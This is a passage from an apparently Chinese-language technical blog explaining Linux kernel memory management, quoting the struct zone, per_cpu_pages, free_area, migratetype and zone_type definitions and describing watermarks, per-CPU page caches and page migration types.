class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">zone</span> &#123;</span></span><br><span class="line"><span class="comment">/* Read-mostly fields */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* zone watermarks, access with *_wmark_pages(zone) macros */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> _watermark[NR_WMARK];</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> watermark_boost;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> nr_reserved_highatomic;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * We don&#x27;t know if the memory that we&#x27;re going to allocate will be</span></span><br><span class="line"><span class="comment"> * freeable or/and it will be released eventually, so to avoid totally</span></span><br><span class="line"><span class="comment"> * wasting several GB of ram we must reserve some of the lower zone</span></span><br><span class="line"><span class="comment"> * memory (otherwise we risk to run OOM on the lower zones despite</span></span><br><span class="line"><span class="comment"> * there being tons of freeable ram on the higher zones).  This array is</span></span><br><span class="line"><span class="comment"> * recalculated at runtime if the sysctl_lowmem_reserve_ratio sysctl</span></span><br><span class="line"><span class="comment"> * changes.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">long</span> lowmem_reserve[MAX_NR_ZONES];</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_NUMA</span></span><br><span class="line"><span class="keyword">int</span> node;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pglist_data</span>*<span class="title">zone_pgdat</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">per_cpu_pages</span>__<span class="title">percpu</span> *<span class="title">per_cpu_pageset</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">per_cpu_zonestat</span>__<span class="title">percpu</span> *<span class="title">per_cpu_zonestats</span>;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * the high and batch values are copied to individual pagesets for</span></span><br><span class="line"><span class="comment"> * faster access</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">int</span> pageset_high;</span><br><span class="line"><span class="keyword">int</span> pageset_batch;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> CONFIG_SPARSEMEM</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Flags for a pageblock_nr_pages block. See pageblock-flags.h.</span></span><br><span class="line"><span class="comment"> * In SPARSEMEM, this map is stored in struct mem_section</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span>*pageblock_flags;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* CONFIG_SPARSEMEM */</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* zone_start_pfn == zone_start_paddr &gt;&gt; PAGE_SHIFT */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span>zone_start_pfn;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * spanned_pages is the total pages spanned by the zone, including</span></span><br><span class="line"><span class="comment"> * holes, which is calculated as:</span></span><br><span class="line"><span class="comment"> * spanned_pages = zone_end_pfn - zone_start_pfn;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * present_pages is physical pages existing within the zone, which</span></span><br><span class="line"><span class="comment"> * is calculated as:</span></span><br><span class="line"><span class="comment"> *present_pages = spanned_pages - absent_pages(pages in holes);</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * present_early_pages is present pages existing within the zone</span></span><br><span class="line"><span class="comment"> * located on memory available since early boot, excluding hotplugged</span></span><br><span class="line"><span class="comment"> * memory.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * managed_pages is present pages managed by the buddy system, which</span></span><br><span class="line"><span class="comment"> * is calculated as (reserved_pages includes pages allocated by the</span></span><br><span class="line"><span class="comment"> * bootmem allocator):</span></span><br><span class="line"><span class="comment"> *managed_pages = present_pages - reserved_pages;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * cma pages is present pages that are assigned for CMA use</span></span><br><span class="line"><span class="comment"> * (MIGRATE_CMA).</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * So present_pages may be used by memory hotplug or memory power</span></span><br><span class="line"><span class="comment"> * management logic to figure out unmanaged pages by checking</span></span><br><span class="line"><span class="comment"> * (present_pages - managed_pages). And managed_pages should be used</span></span><br><span class="line"><span class="comment"> * by page allocator and vm scanner to calculate all kinds of watermarks</span></span><br><span class="line"><span class="comment"> * and thresholds.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Locking rules:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * zone_start_pfn and spanned_pages are protected by span_seqlock.</span></span><br><span class="line"><span class="comment"> * It is a seqlock because it has to be read outside of zone-&gt;lock,</span></span><br><span class="line"><span class="comment"> * and it is done in the main allocator path.  But, it is written</span></span><br><span class="line"><span class="comment"> * quite infrequently.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The span_seq lock is declared along with zone-&gt;lock because it is</span></span><br><span class="line"><span class="comment"> * frequently read in proximity to zone-&gt;lock.  It&#x27;s good to</span></span><br><span class="line"><span class="comment"> * give them a chance of being in the same cacheline.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Write access to present_pages at runtime should be protected by</span></span><br><span class="line"><span class="comment"> * mem_hotplug_begin/done(). Any reader who can&#x27;t tolerant drift of</span></span><br><span class="line"><span class="comment"> * present_pages should use get_online_mems() to get a stable value.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">atomic_long_t</span>managed_pages;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span>spanned_pages;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span>present_pages;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(CONFIG_MEMORY_HOTPLUG)</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span>present_early_pages;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_CMA</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span>cma_pages;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span>*name;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_MEMORY_ISOLATION</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Number of isolated pageblock. It is used to solve incorrect</span></span><br><span class="line"><span class="comment"> * freepage counting problem due to racy retrieving migratetype</span></span><br><span class="line"><span class="comment"> * of pageblock. Protected by zone-&gt;lock.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span>nr_isolate_pageblock;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_MEMORY_HOTPLUG</span></span><br><span class="line"><span class="comment">/* see spanned/present_pages for more description */</span></span><br><span class="line"><span class="keyword">seqlock_t</span>span_seqlock;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> initialized;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Write-intensive fields used from the page allocator */</span></span><br><span class="line">CACHELINE_PADDING(_pad1_);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* free areas of different sizes */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">free_area</span><span class="title">free_area</span>[<span class="title">MAX_ORDER</span> + 1];</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_UNACCEPTED_MEMORY</span></span><br><span class="line"><span class="comment">/* Pages to be accepted. All pages on the list are MAX_ORDER */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span><span class="title">unaccepted_pages</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* zone flags, see below */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span>flags;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Primarily protects free_area */</span></span><br><span class="line"><span class="keyword">spinlock_t</span>lock;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Write-intensive fields used by compaction and vmstats. */</span></span><br><span class="line">CACHELINE_PADDING(_pad2_);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * When free pages are below this point, additional steps are taken</span></span><br><span class="line"><span class="comment"> * when reading the number of free pages to avoid per-cpu counter</span></span><br><span class="line"><span class="comment"> * drift allowing watermarks to be breached</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> percpu_drift_mark;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined CONFIG_COMPACTION || defined CONFIG_CMA</span></span><br><span class="line"><span class="comment">/* pfn where compaction free scanner should start */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span>compact_cached_free_pfn;</span><br><span class="line"><span class="comment">/* pfn where compaction migration scanner should start */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span>compact_cached_migrate_pfn[ASYNC_AND_SYNC];</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span>compact_init_migrate_pfn;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span>compact_init_free_pfn;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_COMPACTION</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * On compaction failure, 1&lt;&lt;compact_defer_shift compactions</span></span><br><span class="line"><span class="comment"> * are skipped before trying again. The number attempted since</span></span><br><span class="line"><span class="comment"> * last failure is tracked with compact_considered.</span></span><br><span class="line"><span class="comment"> * compact_order_failed is the minimum compaction failed order.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span>compact_considered;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span>compact_defer_shift;</span><br><span class="line"><span class="keyword">int</span>compact_order_failed;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined CONFIG_COMPACTION || defined CONFIG_CMA</span></span><br><span class="line"><span class="comment">/* Set to true when the PG_migrate_skip bits should be cleared */</span></span><br><span class="line"><span class="keyword">bool</span>compact_blockskip_flush;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">bool</span>contiguous;</span><br><span class="line"></span><br><span class="line">CACHELINE_PADDING(_pad3_);</span><br><span class="line"><span class="comment">/* Zone statistics */</span></span><br><span class="line"><span class="keyword">atomic_long_t</span>vm_stat[NR_VM_ZONE_STAT_ITEMS];</span><br><span class="line"><span class="keyword">atomic_long_t</span>vm_numa_event[NR_VM_NUMA_EVENT_ITEMS];</span><br><span class="line">&#125; ____cacheline_internodealigned_in_smp;</span><br></pre></td></tr></table></figure><h3 id="watermark：水位线"><a href="#watermark：水位线" class="headerlink" title="_watermark：水位线"></a>_watermark：水位线</h3><p>每一个 zone 都有着其对应的三档“水位线”： <code>WMARK_MIN</code>、<code>WMARK_LOW</code>、<code>WMARK_HIGH</code>，存放在 _watermark 数组中，在进行内存分配时，分配器（例如 buddy system）会根据当前 zone 中空余内存所处在的“水位线”来判断当前的内存状况。在进行内存分配的时候，如果分配器（比如buddy allocator）发现当前空余内存的值低于”low”但高于”min”，说明现在内存面临一定的压力，那么在此次内存分配完成后，kswapd将被唤醒，以执行内存回收操作。在这种情况下，内存分配虽然会触发内存回收，但不存在被内存回收所阻塞的问题，两者的执行关系是异步的（之前的kswapd实现是周期性触发）。”low”可以被认为是一个警戒水位线，而”high”则是一个安全的水位线。</p><p><img   src="/images/8OuZhEfjHIy9AeL.png" ></p><h3 id="lowmem-reserve：zone自身的保留内存"><a href="#lowmem-reserve：zone自身的保留内存" class="headerlink" title="lowmem_reserve：zone自身的保留内存"></a>lowmem_reserve：zone自身的保留内存</h3><p>在进行内存分配时，若当前的 zone 没有足够的内存了，则会向下一个 zone 索要内存，那么这就存在一个问题：来自 higher zones 的内存分配请求可能耗尽 lower zones 的内存，但这样分配的内存未必是可释放的（freeable），亦或者&#x2F;且最终不一定会被释放，这有可能导致 lower zones 的内存提前耗尽，而 higher zones 却仍保留有大量的内存</p><p>为了避免这样的一种情况的发生，<code>lowmem_reserve</code> 字段用以声明为该 zone 保留的内存，这一块内存别的 zone 是不能动的</p><h3 id="node：NUMA中标识所属node"><a href="#node：NUMA中标识所属node" class="headerlink" title="node：NUMA中标识所属node"></a>node：NUMA中标识所属node</h3><p>只有在<code>CONFIG_NUMA</code>即开启NUMA时该字段才会被启用，用来标识该zone所属的node。</p><p><img   src="/images/uwbo53W2Mjh1gOm.png" ></p><h3 id="zone-pgdat：zone-所属的-pglist-data-节点"><a href="#zone-pgdat：zone-所属的-pglist-data-节点" class="headerlink" title="zone_pgdat：zone 所属的 pglist_data 节点"></a>zone_pgdat：zone 所属的 pglist_data 节点</h3><p>该字段用以标识该 zone 所属的 pglist_data 节点</p><h3 id="per-cpu-pageset：zone-为每个-CPU-划分一个独立的”页面仓库“"><a href="#per-cpu-pageset：zone-为每个-CPU-划分一个独立的”页面仓库“" class="headerlink" title="per_cpu_pageset：zone 为每个 CPU 划分一个独立的”页面仓库“"></a>per_cpu_pageset：zone 为每个 CPU 划分一个独立的”页面仓库“</h3><p>众所周知伴随着多 CPU 的引入，条件竞争就是一个不可忽视的问题，当多个 CPU 需要对一个 zone 进行操作时，频繁的加锁&#x2F;解锁操作则毫无疑问会造成大量的开销，因此 zone 引入了 <code>per_cpu_pageset</code> 结构体成员，即为每一个 CPU 都准备一个单独的页面仓库，因此其实现方式是实现为一个 <code>percpu</code> 变量。在一开始时<code>buddy system</code>会将页面放置到各个 CPU 自己独立的页面仓库中，需要进行分配时 CPU 优先从自己的页面仓库中分配。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">per_cpu_pages</span> &#123;</span></span><br><span class="line"><span class="keyword">spinlock_t</span> lock;<span class="comment">/* Protects lists field */</span></span><br><span class="line"><span class="keyword">int</span> count;<span class="comment">/* number of pages in the list */</span></span><br><span class="line"><span class="keyword">int</span> high;<span class="comment">/* high watermark, emptying needed */</span></span><br><span class="line"><span class="keyword">int</span> batch;<span class="comment">/* chunk size for buddy add/remove */</span></span><br><span class="line"><span class="keyword">short</span> free_factor;<span class="comment">/* batch scaling factor during free */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_NUMA</span></span><br><span class="line"><span class="keyword">short</span> expire;<span class="comment">/* When 0, remote pagesets are drained */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Lists of pages, one per migrate type stored on the pcp-lists */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">lists</span>[<span class="title">NR_PCP_LISTS</span>];</span></span><br><span class="line">&#125; ____cacheline_aligned_in_smp;</span><br></pre></td></tr></table></figure><p>该结构体会被存放在每个 CPU 自己独立的 <code>.data..percpu</code> 段中。</p><h3 id="vm-stat：统计数据"><a href="#vm-stat：统计数据" class="headerlink" title="vm_stat：统计数据"></a>vm_stat：统计数据</h3><p>该数组用来进行数据统计，按照枚举类型 <code>zone_stat_item</code> 分为多个数组，以统计不同类型的数据（比如说 <code>NR_FREE_PAGES</code> 表示 zone 中的空闲页面1数量）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">zone_stat_item</span> &#123;</span></span><br><span class="line"><span class="comment">/* First 128 byte cacheline (assuming 64 bit words) */</span></span><br><span class="line">NR_FREE_PAGES,</span><br><span class="line">NR_ZONE_LRU_BASE, <span class="comment">/* Used only for compaction and reclaim retry */</span></span><br><span class="line">NR_ZONE_INACTIVE_ANON = NR_ZONE_LRU_BASE,</span><br><span class="line">NR_ZONE_ACTIVE_ANON,</span><br><span class="line">NR_ZONE_INACTIVE_FILE,</span><br><span class="line">NR_ZONE_ACTIVE_FILE,</span><br><span class="line">NR_ZONE_UNEVICTABLE,</span><br><span class="line">NR_ZONE_WRITE_PENDING,<span class="comment">/* Count of dirty, writeback and unstable pages */</span></span><br><span class="line">NR_MLOCK,<span class="comment">/* mlock()ed pages found and moved off LRU */</span></span><br><span class="line"><span class="comment">/* Second 128 byte cacheline */</span></span><br><span class="line">NR_BOUNCE,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> IS_ENABLED(CONFIG_ZSMALLOC)</span></span><br><span class="line">NR_ZSPAGES,<span class="comment">/* allocated in zsmalloc */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">NR_FREE_CMA_PAGES,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_UNACCEPTED_MEMORY</span></span><br><span class="line">NR_UNACCEPTED,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">NR_VM_ZONE_STAT_ITEMS &#125;;</span><br></pre></td></tr></table></figure><h3 id="free-area：buddy-system-按照-order-管理的页面"><a href="#free-area：buddy-system-按照-order-管理的页面" class="headerlink" title="free_area：buddy system 按照 order 管理的页面"></a>free_area：buddy system 按照 order 管理的页面</h3><p>该字段用以存储<code>buddy system</code>按照 order 管理的页面，为一个 <code>free_area</code> 结构体数组，该结构体定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">free_area</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span><span class="title">free_list</span>[<span class="title">MIGRATE_TYPES</span>];</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span>nr_free;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在 free_area 中存放的页面通过自身的相应字段连接成双向链表结构</p><p><img   src="/images/sOwdI5YMNUjLSib.png" ></p><p>free_area 中并非只有一个双向链表，而是按照不同的“迁移类型”（migrate type）进行分开存放，这是由于页面迁移机制的存在。</p><p><img   src="/images/sbNImKo6tBS5GUe.png" ></p><h3 id="后续成员"><a href="#后续成员" class="headerlink" title="后续成员"></a>后续成员</h3><p><strong>zone_start_pfn：zone 的起始物理PFN</strong></p><p>该字段用以标识该 zone 的起始物理页帧号。</p><p><strong>spanned_pages：zone 对应的内存区域中的 pages 总数（包括空洞）</strong></p><p>该字段用以标识该 zone 对应的内存区域中的 pages 总数, <strong>包括空洞</strong></p><p><strong>present_pages： zone 中存在的物理页框数</strong></p><p>该字段用以标识 zone 中实际存在的物理页框数</p><p><strong>managed_pages：zone 中 buddy system 管理的页面数量</strong></p><p>该字段用以标识 zone 中 buddy system 管理的页面数量</p><p><strong>flags：标志位</strong></p><p>该 zone 的标志位，用以标识其所处的状态</p><h3 id="页面迁移机制"><a href="#页面迁移机制" class="headerlink" title="页面迁移机制"></a>页面迁移机制</h3><p>页面迁移主要用以解决内核空间中的碎片问题，在长期的运行之后内存当中空闲页面的分布可能是零散的，这便导致了内核有可能无法映射到足够大的连续内存，因此需要进行页面迁移即将旧的页面迁移到新的位置，相信大家在操作系统课都学习过的。</p><p>但并非所有的页面都是能够随意迁移的，因此我们在 buddy system 当中还需要将页面按照迁移类型进行分类。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">migratetype</span> &#123;</span></span><br><span class="line">MIGRATE_UNMOVABLE,</span><br><span class="line">MIGRATE_MOVABLE,</span><br><span class="line">MIGRATE_RECLAIMABLE,</span><br><span class="line">MIGRATE_PCPTYPES,<span class="comment">/* the number of types on the pcp lists */</span></span><br><span class="line">MIGRATE_HIGHATOMIC = MIGRATE_PCPTYPES,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_CMA</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * MIGRATE_CMA migration type is designed to mimic the way</span></span><br><span class="line"><span class="comment"> * ZONE_MOVABLE works.  Only movable pages can be allocated</span></span><br><span class="line"><span class="comment"> * from MIGRATE_CMA pageblocks and page allocator never</span></span><br><span class="line"><span class="comment"> * implicitly change migration type of MIGRATE_CMA pageblock.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The way to use it is to change migratetype of a range of</span></span><br><span class="line"><span class="comment"> * pageblocks to MIGRATE_CMA which can be done by</span></span><br><span class="line"><span class="comment"> * __free_pageblock_cma() function.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">MIGRATE_CMA,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_MEMORY_ISOLATION</span></span><br><span class="line">MIGRATE_ISOLATE,<span class="comment">/* can&#x27;t allocate from here */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">MIGRATE_TYPES</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>迁移类型由上面的枚举类型定义。</p><ul><li>MIGRATE_UNMOVABLE：这类型页面在内存当中有着固定的位置，不能移动</li><li>MIGRATE_MOVABLE：这类页面可以随意移动，例如用户空间的页面，我们只需要复制数据后改变页表映射即可</li><li>MIGRATE_RECLAIMABLE：这类页面不能直接移动，但是可以删除，例如映射自文件的页</li><li>MIGRATE_PCPTYPES：<code>per_cpu_pageset</code>，即每 CPU 页帧缓存，其迁移仅限于同一节点内</li><li>MIGRATE_ISOLATE：不能从该链表分配页面，该链表用于跨 NUMA 节点进行页面移动，将页面移动到使用该页面最为频繁的 CPU 所处节点</li><li>MIGRATE_TYPES：表示迁移类型的数目，并不存在这一链表</li></ul><h3 id="zone分类"><a href="#zone分类" class="headerlink" title="zone分类"></a>zone分类</h3><p>在 Linux kernel 当中，我们根据内存区段的不同用途，将其划分为不同的 zone</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">zone_type</span> &#123;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * ZONE_DMA and ZONE_DMA32 are used when there are peripherals not able</span></span><br><span class="line"><span class="comment"> * to DMA to all of the addressable memory (ZONE_NORMAL).</span></span><br><span class="line"><span class="comment"> * On architectures where this area covers the whole 32 bit address</span></span><br><span class="line"><span class="comment"> * space ZONE_DMA32 is used. ZONE_DMA is left for the ones with smaller</span></span><br><span class="line"><span class="comment"> * DMA addressing constraints. This distinction is important as a 32bit</span></span><br><span class="line"><span class="comment"> * DMA mask is assumed when ZONE_DMA32 is defined. Some 64-bit</span></span><br><span class="line"><span class="comment"> * platforms may need both zones as they support peripherals with</span></span><br><span class="line"><span class="comment"> * different DMA addressing limitations.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_ZONE_DMA</span></span><br><span class="line">ZONE_DMA,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_ZONE_DMA32</span></span><br><span class="line">ZONE_DMA32,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Normal addressable memory is in ZONE_NORMAL. DMA operations can be</span></span><br><span class="line"><span class="comment"> * performed on pages in ZONE_NORMAL if the DMA devices support</span></span><br><span class="line"><span class="comment"> * transfers to all addressable memory.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">ZONE_NORMAL,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_HIGHMEM</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * A memory area that is only addressable by the kernel through</span></span><br><span class="line"><span class="comment"> * mapping portions into its own address space. This is for example</span></span><br><span class="line"><span class="comment"> * used by i386 to allow the kernel to address the memory beyond</span></span><br><span class="line"><span class="comment"> * 900MB. The kernel will set up special mappings (page</span></span><br><span class="line"><span class="comment"> * table entries on i386) for each page that the kernel needs to</span></span><br><span class="line"><span class="comment"> * access.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">ZONE_HIGHMEM,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * ZONE_MOVABLE is similar to ZONE_NORMAL, except that it contains</span></span><br><span class="line"><span class="comment"> * movable pages with few exceptional cases described below. Main use</span></span><br><span class="line"><span class="comment"> * cases for ZONE_MOVABLE are to make memory offlining/unplug more</span></span><br><span class="line"><span class="comment"> * likely to succeed, and to locally limit unmovable allocations - e.g.,</span></span><br><span class="line"><span class="comment"> * to increase the number of THP/huge pages. Notable special cases 